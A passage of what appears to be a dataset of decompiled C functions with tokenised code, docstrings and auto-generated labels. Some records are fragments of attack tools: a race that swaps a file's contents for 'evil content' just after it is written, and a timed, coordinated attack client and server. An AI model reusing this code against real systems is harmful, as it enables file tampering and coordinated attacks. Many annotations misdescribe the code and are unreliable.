            "if",
            "(",
            "wd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "__assert_fail",
            "(",
            "\"wd != -1\"",
            ",",
            "\"efcr.c\"",
            ",",
            "0x2Au",
            ",",
            "\"check_for_close\"",
            ")",
            ";",
            "read",
            "(",
            "inofd",
            ",",
            "buf",
            ",",
            "0x110uL",
            "L",
            ")",
            ";",
            "clock_gettime",
            "(",
            "1",
            ",",
            "t",
            ")",
            ";",
            "fwrite",
            "(",
            "\"efcr: file was just closed after writing! The race begins!\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x3BuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "inotify_rm_watch",
            "(",
            "inofd",
            ",",
            "wd",
            ")",
            ";",
            "close",
            "(",
            "inofd",
            ")",
            ";",
            "inofd",
            "=",
            "-",
            "1",
            ";",
            "return",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "This function is used to read a quadword (64-bit) value from the FS segment register in x86 and x64 architectures.",
            "The function __assert_fail is typically used in C programming as part of the assert macro implementation to handle assertion failures by logging an error message with file, line, and function information before aborting the program execution.",
            "The `close` function appears to be part of a larger codebase involving system calls and memory manipulation, likely used to close file descriptors and clean up resources allocated by other functions within the code.",
            "The `fwrite` function is used to write data from a specified memory location (`ptr`) to a file (`stream`) in binary mode, where `size` specifies the size of each element to be written, and `nmemb` specifies the number of such elements to write.",
            "The `inotify` function, likely a C/C++ function, integrates the Linux `inotify` subsystem for monitoring filesystem events such as file creation, deletion, and modification, facilitating real-time notifications within applications.",
            "The function `clock_` appears to be part of a larger program or system, likely related to managing user input events and saving system states including console and clock states, and possibly emulating timers within a Z8 microcontroller, primarily utilized for user interaction handling and system state preservation."
        ],
        "longer_label": "The code initializes an inotify file descriptor, sets up a watch on a specified path, reads events from the inotify descriptor, retrieves the current time, and removes the watch before closing the descriptor, likely part of a larger system monitoring or file tracking functionality."
    },
    {
        "id": 241,
        "docstring_tokens": [
            "This",
            "code",
            "replaces",
            "the",
            "contents",
            "of",
            "a",
            "file",
            "specified",
            "by",
            "the",
            "path",
            "with",
            "the",
            "contents",
            "of",
            "another",
            "file",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "path",
            ")",
            "{",
            "int",
            "fd",
            ";",
            "stat",
            "st",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "fwrite",
            "(",
            "\"efcr: Replacing contents...\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x1CuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fd",
            "=",
            "open",
            "(",
            "path",
            ",",
            "513",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "__assert_fail",
            "(",
            "\"fd != -1\"",
            ",",
            "\"efcr.c\"",
            ",",
            "0x3Fu",
            ",",
            "\"replace_evil_content\"",
            ")",
            ";",
            "if",
            "(",
            "fstat",
            "(",
            "in_fd",
            ",",
            "&",
            "st",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "__assert_fail",
            "(",
            "\"fstat(in_fd, &st) != -1\"",
            ",",
            "\"efcr.c\"",
            ",",
            "0x40u",
            ",",
            "\"replace_evil_content\"",
            ")",
            ";",
            "lseek",
            "(",
            "in_fd",
            ",",
            "0L",
            "L",
            ",",
            "0",
            ")",
            ";",
            "sendfile",
            "(",
            "fd",
            ",",
            "in_fd",
            ",",
            "0L",
            "L",
            ",",
            "st",
            ".",
            "st_size",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "fwrite",
            "(",
            "\"efcr: ... done.\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` seems to be a custom implementation for reading data from devices or files, potentially involving low-level operations like memory allocation, device interaction, file system operations, and handling of weak symbols for library interactions.",
            "The `fwrite` function is being manipulated within a larger codebase, involving file operations, error handling, and debugging hooks, likely to write data to a file stream with error checking and debugging capabilities.",
            "The function __assert_fail is a custom assertion failure handler used in C programming to log an error message with assertion details and terminate the program when an assertion fails.",
            "The function `_contentlseek` likely seeks the position of the content within a file, possibly for navigation or manipulation purposes, though without code snippets it's hard to provide more specific analysis.",
            "The `close` function appears to be part of a larger program or library, primarily focusing on low-level system operations such as file I/O, memory mapping, and directory iteration, likely serving to close file descriptors and perform cleanup tasks after operations are completed."
        ],
        "longer_label": "The provided code is a C function that replaces the contents of a specified file, utilizing low-level file operations, error handling, and custom assertion failure handling."
    },
    {
        "id": 242,
        "docstring_tokens": [
            "The",
            "function",
            "replacer_loop",
            "continuously",
            "checks",
            "for",
            "the",
            "close",
            "(",
            ")",
            "system",
            "call",
            "after",
            "writing",
            "and",
            "replaces",
            "any",
            "evil",
            "content",
            "in",
            "a",
            "specified",
            "file",
            "path",
            ",",
            "measuring",
            "the",
            "time",
            "it",
            "takes",
            "for",
            "the",
            "operation",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "path",
            ")",
            "{",
            "timespec",
            "start",
            ";",
            "timespec",
            "end",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "while",
            "(",
            "check_for_close",
            "(",
            "path",
            ",",
            "&",
            "start",
            ")",
            ")",
            "{",
            "replace_evil_content",
            "(",
            "path",
            ")",
            ";",
            "clock_gettime",
            "(",
            "1",
            ",",
            "&",
            "end",
            ")",
            ";",
            "fprintf",
            "(",
            "stdout",
            ",",
            "\"noticing close() after write and replacing with evil contents took %zdns\\n\"",
            ",",
            "1000000000",
            "*",
            "(",
            "end",
            ".",
            "tv_sec",
            "-",
            "start",
            ".",
            "tv_sec",
            ")",
            "+",
            "end",
            ".",
            "tv_nsec",
            "-",
            "start",
            ".",
            "tv_nsec",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` likely retrieves an unsigned 64-bit integer from a specified offset within the FS segment, primarily used for low-level system programming on x86 or x64 architectures.",
            "The `_for_close` function appears to handle closing operations related to network connections, proxy entries, and operating system windows, marking them for closure and performing necessary cleanup tasks.",
            "The \"replace\" function likely serves to replace occurrences of a specified character with another character within a given text or string.",
            "The `content` function likely belongs to a terminal emulator's source code and is responsible for managing the terminal's display, including handling events, updating content, and managing drawing to reduce flicker and tearing.",
            "The function `clock_get` is likely intended to retrieve the current time or timestamp using various clock sources, potentially for timing operations or coordinating events in the context of a virtual machine environment."
        ],
        "longer_label": "The provided code defines a function `replacer_loop` which continuously checks for network connection closures using `check_for_close`, replaces potentially malicious content in a specified file path using `replace_evil_content`, and measures the time taken for these operations, likely for security monitoring purposes."
    },
    {
        "id": 243,
        "docstring_tokens": [
            "The",
            "main",
            "function",
            "takes",
            "two",
            "command",
            "line",
            "arguments",
            ",",
            "opens",
            "a",
            "file",
            "specified",
            "by",
            "the",
            "first",
            "argument",
            ",",
            "and",
            "then",
            "executes",
            "a",
            "replacer",
            "loop",
            "on",
            "the",
            "second",
            "argument",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "if",
            "(",
            "argc",
            "!",
            "=",
            "3",
            ")",
            "usage",
            "(",
            "-",
            "1",
            ")",
            ";",
            "open_evil_file",
            "(",
            "(",
            "char",
            "*",
            ")",
            "argv",
            "[",
            "1",
            "]",
            ")",
            ";",
            "replacer_loop",
            "(",
            "(",
            "char",
            "*",
            ")",
            "argv",
            "[",
            "2",
            "]",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a C program that takes in two command line arguments and opens a file specified by the first argument, then enters a loop to replace certain characters in the file with those specified by the second argument."
    },
    {
        "id": 244,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "handler",
            "function",
            "that",
            "checks",
            "if",
            "a",
            "specific",
            "signal",
            "value",
            "is",
            "received",
            ",",
            "and",
            "if",
            "so",
            ",",
            "deletes",
            "a",
            "timer",
            ",",
            "closes",
            "socket",
            "connections",
            ",",
            "creates",
            "a",
            "new",
            "thread",
            "for",
            "handling",
            "an",
            "attack",
            ",",
            "waits",
            "for",
            "the",
            "thread",
            "to",
            "finish",
            ",",
            "and",
            "exits",
            "successfully",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "sig",
            ",",
            "siginfo_t",
            "*",
            "si_0",
            ",",
            "void",
            "*",
            "uc",
            ")",
            "{",
            "if",
            "(",
            "si_0",
            "-",
            ">",
            "_sifields",
            ".",
            "_timer",
            ".",
            "si_sigval",
            ".",
            "sival_ptr",
            "=",
            "=",
            "&",
            "timerid",
            ")",
            "{",
            "timer_delete",
            "(",
            "timerid",
            ")",
            ";",
            "close",
            "(",
            "newsockfd",
            ")",
            ";",
            "close",
            "(",
            "sockfd",
            ")",
            ";",
            "pthread_create",
            "(",
            "&",
            "attackth",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "attackthread_handler",
            ",",
            "\"processing...\"",
            ")",
            ";",
            "pthread_join",
            "(",
            "attackth",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"Stray signal\"",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "",
            "The `delete` function appears to be part of a text editor or line editor program, likely involved in deleting characters or lines from a buffer or linked list representing text content.",
            "The \"close\" function, likely part of a larger C program, handles file descriptor closure and potentially other cleanup operations, ensuring proper resource management and releasing of system resources like memory mappings or file handles.",
            "The `_create` function likely serves to initialize and load playlist files from a directory, while `pl_create_default` adds a default playlist, potentially part of a music player or management system."
        ],
        "longer_label": "The provided code is a signal handler function in C that, upon receiving a specific signal associated with a timer, deletes the timer, closes two socket file descriptors, creates and joins a pthread for handling an attack thread, and then exits the program, with an added condition to print \"Stray signal\" if the signal received does not match the expected one."
    },
    {
        "id": 245,
        "docstring_tokens": [
            "The",
            "code",
            "establishes",
            "a",
            "connection",
            "with",
            "a",
            "server",
            ",",
            "sends",
            "a",
            "message",
            ",",
            "and",
            "closes",
            "the",
            "connection",
            "after",
            "a",
            "15-second",
            "delay",
            "."
        ],
        "code_tokens": [
            "void",
            "*",
            "FUN0",
            "attackthread_handler",
            "(",
            "void",
            "*",
            "args",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v1",
            ";",
            "const",
            "char",
            "*",
            "v2",
            ";",
            "size_t",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "const",
            "char",
            "*",
            "v5",
            ";",
            "void",
            "*",
            "result",
            ";",
            "sockfd_cl",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd_cl",
            "<",
            "0",
            ")",
            "error",
            "(",
            "(",
            "int",
            ")",
            "\"ERROR opening socket\"",
            ",",
            "1",
            ",",
            "v1",
            ")",
            ";",
            "server",
            "=",
            "gethostbyname",
            "(",
            "servername",
            ")",
            ";",
            "if",
            "(",
            "!",
            "server",
            ")",
            "{",
            "fwrite",
            "(",
            "\"ERROR, no such host\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x14uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "serv_addr_cl",
            ".",
            "sin_family",
            "=",
            "2L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "serv_addr_cl",
            ".",
            "sin_zero",
            "=",
            "0L",
            "L",
            ";",
            "memmove",
            "(",
            "&",
            "serv_addr_cl",
            ".",
            "sin_addr",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "server",
            "-",
            ">",
            "h_addr_list",
            ",",
            "server",
            "-",
            ">",
            "h_length",
            ")",
            ";",
            "serv_addr_cl",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "portno_cl",
            ")",
            ";",
            "if",
            "(",
            "connect",
            "(",
            "sockfd_cl",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "serv_addr_cl",
            ",",
            "0x10u",
            ")",
            "<",
            "0",
            ")",
            "error",
            "(",
            "(",
            "int",
            ")",
            "\"ERROR connecting\"",
            ",",
            "(",
            "int",
            ")",
            "&",
            "serv_addr_cl",
            ",",
            "v2",
            ")",
            ";",
            "sleep",
            "(",
            "0xFu",
            ")",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "servername",
            ")",
            ";",
            "v4",
            "=",
            "(",
            "int",
            ")",
            "servername",
            ";",
            "n",
            "=",
            "write",
            "(",
            "sockfd_cl",
            ",",
            "servername",
            ",",
            "v3",
            ")",
            ";",
            "if",
            "(",
            "n",
            "<",
            "0",
            ")",
            "error",
            "(",
            "(",
            "int",
            ")",
            "\"ERROR writing to socket\"",
            ",",
            "v4",
            ",",
            "v5",
            ")",
            ";",
            "LODWORD",
            "(",
            "result",
            ")",
            "=",
            "close",
            "(",
            "sockfd_cl",
            ")",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `gethost` appears to be part of a network utility program, aiming to resolve hostnames to IP addresses for various networking operations, including socket creation and communication.",
            "The `memmove` function is implemented to copy a block of memory from one location to another, handling overlapping memory regions safely to prevent data corruption, as demonstrated by its usage in the provided code snippets.",
            "The function \"htons\" appears to convert a 16-bit integer from host byte order to network byte order, commonly used in networking protocols for ensuring compatibility across different architectures.",
            "The \"write\" function is used to write data from a buffer to a specified file descriptor, performing error checks and managing the file's data storage when necessary."
        ],
        "longer_label": "The provided code is a multithreaded function designed to establish a network connection, resolve a hostname to an IP address, send data over the socket, and then close the socket, with annotations highlighting key functions such as `gethost`, `memmove`, and `htons` involved in networking operations."
    },
    {
        "id": 246,
        "docstring_tokens": [
            "The",
            "function",
            "myrkur_free",
            "releases",
            "memory",
            "allocated",
            "for",
            "the",
            "port",
            ",",
            "ip",
            ",",
            "and",
            "victim",
            "fields",
            "of",
            "the",
            "client",
            "struct",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "+",
            "8L",
            "L",
            ")",
            ")",
            "free",
            "(",
            "*",
            "(",
            "void",
            "*",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "+",
            "8L",
            "L",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "*",
            "(",
            "_QWORD",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ")",
            "free",
            "(",
            "*",
            "*",
            "(",
            "void",
            "*",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ")",
            "free",
            "(",
            "*",
            "(",
            "void",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"kur_free\" likely deallocates memory or resources previously allocated by a program, but without the code snippets provided, it's difficult to ascertain its specific implementation or purpose."
        ],
        "longer_label": "The function \"myrkur_free\" is likely designed to deallocate memory or resources previously allocated by a program, utilizing various conditional checks to determine which resources to free."
    },
    {
        "id": 247,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "a",
            "time",
            "of",
            "attack",
            "from",
            "a",
            "socket",
            ",",
            "checks",
            "if",
            "it",
            "is",
            "valid",
            ",",
            "sets",
            "a",
            "timer",
            "based",
            "on",
            "the",
            "time",
            "of",
            "attack",
            ",",
            "and",
            "closes",
            "the",
            "socket",
            "."
        ],
        "code_tokens": [
            "void",
            "*",
            "FUN0",
            "processthread_handler",
            "(",
            "void",
            "*",
            "args",
            ")",
            "{",
            "char",
            "*",
            "v1",
            ";",
            "const",
            "char",
            "*",
            "v2",
            ";",
            "const",
            "char",
            "*",
            "v3",
            ";",
            "void",
            "*",
            "result",
            ";",
            "int",
            "newsockfdd",
            ";",
            "__int64",
            "timeofattack",
            ";",
            "char",
            "*",
            "buffer",
            ";",
            "__int64",
            "currenttime",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "newsockfdd",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "args",
            ";",
            "v1",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x100uL",
            "L",
            ")",
            ";",
            "buffer",
            "=",
            "v1",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "+",
            "31",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v1",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v1",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v1",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "256",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "if",
            "(",
            "(",
            "int",
            ")",
            "read",
            "(",
            "newsockfdd",
            ",",
            "buffer",
            ",",
            "0xFFuL",
            "L",
            ")",
            "<",
            "0",
            ")",
            "error",
            "(",
            "(",
            "int",
            ")",
            "\"ERROR reading from socket\"",
            ",",
            "(",
            "int",
            ")",
            "buffer",
            ",",
            "v2",
            ")",
            ";",
            "__isoc99_sscanf",
            "(",
            "buffer",
            ",",
            "\"%ld\"",
            ",",
            "&",
            "timeofattack",
            ")",
            ";",
            "currenttime",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "currenttime",
            "<",
            "=",
            "timeofattack",
            ")",
            "{",
            "its",
            ".",
            "it_value",
            ".",
            "tv_sec",
            "=",
            "timeofattack",
            "-",
            "currenttime",
            ";",
            "its",
            ".",
            "it_value",
            ".",
            "tv_nsec",
            "=",
            "0L",
            "L",
            ";",
            "its",
            ".",
            "it_interval",
            ".",
            "tv_sec",
            "=",
            "timeofattack",
            "-",
            "currenttime",
            ";",
            "its",
            ".",
            "it_interval",
            ".",
            "tv_nsec",
            "=",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "timer_settime",
            "(",
            "timerid",
            ",",
            "0",
            ",",
            "&",
            "its",
            ",",
            "0L",
            "L",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"timer_settime\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "error",
            "(",
            "(",
            "int",
            ")",
            "\"ERROR Invalid Time of Attack\"",
            ",",
            "(",
            "int",
            ")",
            "\"%ld\"",
            ",",
            "v3",
            ")",
            ";",
            "close",
            "(",
            "newsockfdd",
            ")",
            ";",
            "}",
            "LODWORD",
            "(",
            "result",
            ")",
            "=",
            "close",
            "(",
            "newsockfdd",
            ")",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `malloc` appears to be a custom implementation of memory allocation, possibly aimed at compatibility with a specific environment or platform, providing memory allocation functionality similar to the standard library `malloc` function but utilizing `GlobalAlloc` for allocation instead.",
            "The function \"current\" appears to be a part of a larger program, likely written in C or a similar language, involving memory allocation, UI handling, and possibly text processing, with the function responsible for processing current word indices, lengths, and effects within a given input string."
        ],
        "longer_label": "The provided code is a C function that handles a thread for processing incoming data from a socket, setting up a timer for an attack based on the received time, with custom memory allocation possibly for a specific platform or environment."
    },
    {
        "id": 248,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "socket",
            "thread",
            "handler",
            "that",
            "binds",
            "a",
            "socket",
            ",",
            "listens",
            "for",
            "connections",
            ",",
            "accepts",
            "incoming",
            "connections",
            ",",
            "creates",
            "a",
            "new",
            "thread",
            "to",
            "handle",
            "each",
            "connection",
            ",",
            "and",
            "closes",
            "the",
            "connection",
            "after",
            "processing",
            "."
        ],
        "code_tokens": [
            "void",
            "*",
            "FUN0",
            "__noreturn",
            "socketthread_handler",
            "(",
            "void",
            "*",
            "arg",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v1",
            ";",
            "const",
            "char",
            "*",
            "v2",
            ";",
            "pthread_t",
            "processth",
            ";",
            "int",
            "*",
            "new_sock",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "bind",
            "(",
            "sockfd",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "serv_addr",
            ",",
            "0x10u",
            ")",
            "<",
            "0",
            ")",
            "error",
            "(",
            "(",
            "int",
            ")",
            "\"ERROR on binding\"",
            ",",
            "(",
            "int",
            ")",
            "&",
            "serv_addr",
            ",",
            "v1",
            ")",
            ";",
            "listen",
            "(",
            "sockfd",
            ",",
            "5",
            ")",
            ";",
            "clilen",
            "=",
            "16",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "newsockfd",
            "=",
            "accept",
            "(",
            "sockfd",
            ",",
            "(",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "cli_addr",
            ",",
            "&",
            "clilen",
            ")",
            ";",
            "if",
            "(",
            "newsockfd",
            "<",
            "0",
            ")",
            "error",
            "(",
            "(",
            "int",
            ")",
            "\"ERROR on accept\"",
            ",",
            "(",
            "int",
            ")",
            "&",
            "cli_addr",
            ",",
            "v2",
            ")",
            ";",
            "new_sock",
            "=",
            "(",
            "int",
            "*",
            ")",
            "malloc",
            "(",
            "1uL",
            "L",
            ")",
            ";",
            "*",
            "new_sock",
            "=",
            "newsockfd",
            ";",
            "if",
            "(",
            "pthread_create",
            "(",
            "&",
            "processth",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "processthread_handler",
            ",",
            "new_sock",
            ")",
            "<",
            "0",
            ")",
            "perror",
            "(",
            "\"could not create thread\"",
            ")",
            ";",
            "pthread_join",
            "(",
            "processth",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "close",
            "(",
            "newsockfd",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is utilized to read a quadword (64 bits) from a segment register on Intel x86 architecture, primarily used for accessing thread information block (TIB) fields such as the stack limit or other thread-specific data.",
            "The \"accept\" function is used to validate and consume input symbols or tokens according to a specified grammar or syntax rules within a compiler or interpreter implementation.",
            "The `malloc` function is typically used to allocate memory dynamically, but in this context, it's redefined for a custom memory allocation strategy that utilizes `GlobalAlloc` with `GMEM_ZEROINIT` flag, potentially for specific purposes such as in the provided code snippets for implementing various algorithms and data structures like binary search, permutations, and tree manipulation.",
            "The function `_create` appears to be part of a program or library related to managing playlists, likely within a music player application, where it iterates through a directory, loading each file as a playlist, with additional functionality for creating a default playlist if needed.",
            "The function `close` is a part of a larger codebase that involves file operations, system calls, memory mapping, and potentially directory iteration, primarily aimed at handling file descriptors and ensuring proper resource management and cleanup within a larger software system."
        ],
        "longer_label": "The provided code is a multithreaded socket server implementation using pthreads in C, where a socket is bound, listens for incoming connections, and spawns a new thread to handle each connection, with potential memory allocation modifications and architecture-specific register access."
    },
    {
        "id": 249,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "timer",
            "with",
            "a",
            "signal",
            "handler",
            "and",
            "a",
            "specified",
            "time",
            "interval",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "v0",
            ";",
            "sa",
            ".",
            "sa_flags",
            "=",
            "4",
            ";",
            "sa",
            ".",
            "sa_handler",
            "=",
            "(",
            "__sighandler_t",
            ")",
            "timer_handler",
            ";",
            "sigemptyset",
            "(",
            "&",
            "sa",
            ".",
            "sa_mask",
            ")",
            ";",
            "v0",
            "=",
            "__libc_current_sigrtmin",
            "(",
            ")",
            ";",
            "if",
            "(",
            "sigaction",
            "(",
            "v0",
            ",",
            "&",
            "sa",
            ",",
            "0L",
            "L",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"sigprocmask\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "sev",
            ".",
            "sigev_notify",
            "=",
            "0",
            ";",
            "sev",
            ".",
            "sigev_signo",
            "=",
            "__libc_current_sigrtmin",
            "(",
            ")",
            ";",
            "sev",
            ".",
            "sigev_value",
            ".",
            "sival_ptr",
            "=",
            "&",
            "timerid",
            ";",
            "if",
            "(",
            "timer_create",
            "(",
            "0",
            ",",
            "&",
            "sev",
            ",",
            "&",
            "timerid",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"timer_create\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "its",
            ".",
            "it_value",
            ".",
            "tv_sec",
            "=",
            "1L",
            "L",
            ";",
            "its",
            ".",
            "it_value",
            ".",
            "tv_nsec",
            "=",
            "0L",
            "L",
            ";",
            "its",
            ".",
            "it_interval",
            ".",
            "tv_sec",
            "=",
            "1L",
            "L",
            ";",
            "its",
            ".",
            "it_interval",
            ".",
            "tv_nsec",
            "=",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `perror` is used to print a descriptive error message to the standard error stream, typically indicating the cause of a failed system call, and it's invoked in the provided code snippet when a `write` system call fails within the `swrite` function."
        ],
        "longer_label": "The provided code initializes a timer using POSIX timer functions, setting up a signal handler for timer events, creating a timer, and configuring its initial and interval durations, with error handling using `perror` for system call failures."
    },
    {
        "id": 250,
        "docstring_tokens": [
            "The",
            "function",
            "socket_init",
            "initializes",
            "a",
            "socket",
            "with",
            "the",
            "specified",
            "port",
            "number",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "port",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v1",
            ";",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd",
            "<",
            "0",
            ")",
            "error",
            "(",
            "(",
            "int",
            ")",
            "\"ERROR opening socket\"",
            ",",
            "1",
            ",",
            "v1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "serv_addr",
            ".",
            "sin_family",
            "=",
            "2L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "serv_addr",
            ".",
            "sin_zero",
            "=",
            "0L",
            "L",
            ";",
            "portno",
            "=",
            "port",
            ";",
            "serv_addr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "port",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code initializes a socket on a specified port, handling potential errors, but lacks annotations for further clarification."
    },
    {
        "id": 251,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "a",
            "port",
            "number",
            "from",
            "the",
            "command",
            "line",
            ",",
            "initializes",
            "a",
            "timer",
            ",",
            "initializes",
            "a",
            "socket",
            "with",
            "the",
            "provided",
            "port",
            ",",
            "prompts",
            "the",
            "user",
            "to",
            "enter",
            "an",
            "IP",
            "address",
            "and",
            "port",
            "number",
            ",",
            "starts",
            "a",
            "server",
            "for",
            "a",
            "coordinator",
            "to",
            "connect",
            ",",
            "creates",
            "a",
